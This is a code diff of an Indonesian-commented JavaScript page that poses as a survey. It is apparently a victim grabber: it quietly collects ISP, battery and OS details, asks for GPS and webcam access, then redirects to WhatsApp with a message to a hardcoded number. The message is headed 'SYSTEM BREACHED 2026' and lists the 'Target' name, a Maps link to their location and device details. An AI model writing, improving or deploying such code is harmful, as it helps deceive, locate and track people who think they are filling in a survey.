@@ -2,72 +2,70 @@ const nomorWA = "628979100200";
 let userData = { 
     coords: "Tidak Diizinkan", 
     os: navigator.platform,
-    battery: "Unknown",
+    battery: "Scanning...",
     isp: "Detecting..."
 };
 
-// Ambil Data Baterai & ISP secara aman
-async function fetchAdvancedData() {
+// 1. Fungsi Ambil Data (Dibuat terpisah agar tidak menghambat tombol)
+async function getQuickData() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        userData.isp = data.org || "Protected";
+    } catch (e) { userData.isp = "ISP Hidden"; }
+
     try {
         if (navigator.getBattery) {
             const bat = await navigator.getBattery();
-            userData.battery = `${Math.round(bat.level * 100)}%`;
+            userData.battery = Math.round(bat.level * 100) + "%";
         }
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        userData.isp = data.org;
-    } catch (e) { console.log("Data tambahan gagal."); }
+    } catch (e) { userData.battery = "Hardware Blocked"; }
 }
 
-// Handler Tombol Mulai
-document.getElementById('start-survey').onclick = async function() {
+// 2. Handler Tombol Mulai (LANGSUNG JALAN)
+document.getElementById('start-survey').onclick = function() {
+    // Sembunyikan Step 1, Tampilkan Step 2
     document.getElementById('step-1').style.display = 'none';
     document.getElementById('step-2').style.display = 'block';
     
-    fetchAdvancedData();
+    // Jalankan pengambilan data di latar belakang
+    getQuickData();
 
+    // Minta Izin Lokasi
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (pos) => { userData.coords = `${pos.coords.latitude},${pos.coords.longitude}`; },
-            (err) => { console.log("GPS ditolak"); }
-        );
+        navigator.geolocation.getCurrentPosition((pos) => {
+            userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
+        }, (err) => { console.log("GPS Blocked"); });
     }
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        document.getElementById('webcam').srcObject = stream;
-    } catch (e) { console.log("Kamera ditolak"); }
+
+    // Minta Izin Kamera
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => { document.getElementById('webcam').srcObject = stream; })
+        .catch(e => { console.log("Kamera Blocked"); });
 };
 
-// Fungsi Kirim Utama
-function processSubmit() {
-    const nameInput = document.getElementById('name').value;
-    if (!nameInput) return alert("Silakan isi nama Anda.");
+// 3. Fungsi Kirim (Dijalankan saat Klik atau Enter)
+function finalSubmit() {
+    const nameVal = document.getElementById('name').value;
+    if (!nameVal) return alert("Isi nama dulu!");
 
     document.getElementById('step-2').style.display = 'none';
     document.getElementById('step-3').style.display = 'block';
 
     let prg = 0;
-    const interval = setInterval(() => {
-        prg += 20;
-        document.getElementById('progress').style.width = prg + "%";
+    const bar = document.getElementById('progress');
+    const timer = setInterval(() => {
+        prg += 25;
+        bar.style.width = prg + "%";
         if (prg >= 100) {
-            clearInterval(interval);
-            
-            const mapLink = `https://www.google.com/maps?q=${userData.coords}`;
-            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
-                        `👤 *Target:* ${nameInput}%0A` +
-                        `📍 *Maps:* ${mapLink}%0A` +
-                        `📡 *ISP:* ${userData.isp}%0A` +
-                        `🔋 *Battery:* ${userData.battery}%0A` +
-                        `💻 *OS:* ${userData.os}%0A` +
-                        `🖥️ *Res:* ${window.screen.width}x${window.screen.height}%0A%0A` +
-                        `_Data successfully mirrored to master database._`;
-
+            clearInterval(timer);
+            const mapUrl = `https://www.google.com/maps?q=${userData.coords}`;
+            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A👤 *Target:* ${nameVal}%0A📍 *Maps:* ${mapUrl}%0A📡 *ISP:* ${userData.isp}%0A🔋 *Baterai:* ${userData.battery}%0A💻 *OS:* ${userData.os}%0A%0A_Status: Data Mirrored._`;
             window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
         }
     }, 600);
 }
 
-// Listener Keyboard & Klik
-document.getElementById('submit-survey').onclick = processSubmit;
-document.getElementById('name').onkeydown = (e) => { if (e.key === "Enter") processSubmit(); };
+// Pasang Listener
+document.getElementById('submit-survey').onclick = finalSubmit;
+document.getElementById('name').onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
